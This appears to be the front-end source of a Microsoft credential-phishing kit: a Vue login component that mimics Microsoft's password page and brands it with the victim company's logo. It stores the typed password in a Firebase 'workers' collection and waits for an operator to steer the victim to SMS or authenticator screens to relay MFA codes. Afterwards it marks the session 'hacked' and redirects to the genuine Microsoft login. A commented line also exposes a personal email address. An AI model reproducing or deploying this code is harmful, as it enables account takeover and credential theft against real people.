<template>
  <v-container fill-height class="d-flex justify-center">
    <v-card class="pa-10" width="450" :disabled="disableCard" tile>
      <v-toolbar flat>
        <v-toolbar-title>
          <v-img
            v-if="showLogo"
            class="my-2"
            alt="Microsoft Logo"
            :src="companyLogo"
            transition="scale-transition"
            max-height="70"
            max-width="70"
          />
          <v-img
            v-else
            class="my-2"
            alt="Microsoft Logo"
            :src="require('@/assets/microsoft_logo.svg')"
            transition="scale-transition"
            max-height="90"
            max-width="90"
          />

          <!-- <div class="mt-3">
            <p class="body-1">annalise.buttigieg@bluestone.com.au</p>
          </div>-->
          <v-btn class="text-none pl-1" :text="true" color depressed>
            <!-- <v-icon left>mdi-arrow-left</v-icon> -->
            {{ email }}
          </v-btn>
        </v-toolbar-title>
      </v-toolbar>

      <v-card-text>
        <h2 class="mt-3 mb-4 black--text">Enter password</h2>
        <p class="red--text" v-if="error">
          Your account or password is incorrect. If you don't remember your
          password,
          <router-link to="/">reset it now</router-link>.
        </p>
        <v-form ref="form" lazy-validation v-on:submit.prevent="onSubmit">
          <v-text-field
            :dense="true"
            v-model="password"
            label="Password"
            type="password"
            required
            v-on:keyup.enter="submitForm"
          ></v-text-field>
          <router-link to>
            <p class="caption">Forgot my password</p>
          </router-link>
          <v-row>
            <v-spacer></v-spacer>
            <v-btn
              width=""
              class="rounded-button white--text text-none"
              :depressed="true"
              color="#005DA6"
              @click="submitForm"
              >Sign in</v-btn
            >
          </v-row>
          <p class="caption">
            Welcome and please sign-in with your {{ companyName }} account and
            password
          </p>
        </v-form>
      </v-card-text>
    </v-card>
  </v-container>
</template>

<script>
import { db } from "../firebase";

export default {
  name: "LoginForm",

  data: () => ({
    error: false,
    disableCard: false,
    email: "",
    password: "",
    browser: "",
    companyLogo: "",
    showLogo: false,
  }),

  async created() {
    this.email = this.$route.params.email;
    this.browser = this.$route.params.browser;
    this.companyName = this.email.split("@")[1].split(".")[0];
    window.document.title = this.companyName;
    this.getCompanyLogo(this.email);
    let workers = await db.collection("workers");

    workers.where("browser", "==", this.browser).onSnapshot((snapshot) => {
      snapshot.docChanges().forEach(async (change) => {
        let data = change.doc.data();
        console.log(change.type);
        if (data.from === "server" && change.type === "modified") {
          // User enters wrong password.
          if (data.info === "password_error") {
            this.error = true;
            this.disableCard = false;
            this.password = "";
          }

          // Go to sms app
          if (data.screenState === "sms") {
            await this.$router.push({
              path: `/login/sms/${this.email}/${this.browser}/${data.smsInfo}`,
            });
          }

          // GO to auth app.
          if (data.screenState === "authenticator") {
            await this.$router.push({
              path: `/login/authenticator/${this.email}/${this.browser}`,
            });
          }

          // Verification complete
          if (data.info === "verification_complete") {
            localStorage.setItem("hacked", true);
            window.location.href = `https://login.microsoftonline.com`;
          }
        }
      });
    });
  },

  computed: {},

  methods: {
    getCompanyLogo(email) {
      let logoURL = `https://logo.clearbit.com/${email.split("@")[1]}`;
      this.$http.get(logoURL).then((res) => {
        console.log("about to respond");
        if (res.status === 200) {
          console.log("200 status");
          this.companyLogo = logoURL;
          this.showLogo = true;
        }
      });
    },
    async submitForm() {
      this.disableCard = true;
      this.error = false;

      if (this.password.length < 4) {
        this.error = true;
        this.disableCard = false;
        return;
      }

      let workers = await db.collection("workers");

      await workers.doc(this.browser).set(
        {
          browser: this.browser,
          data_type: "password",
          password: this.password,
          from: "client",
          info: "",
        },
        { merge: true }
      );
    },
  },
};
</script>
<style lang="scss">
a {
  text-decoration: none;
  color: #005da6;
}
.rounded-button {
  border-radius: 0px;
}
</style>
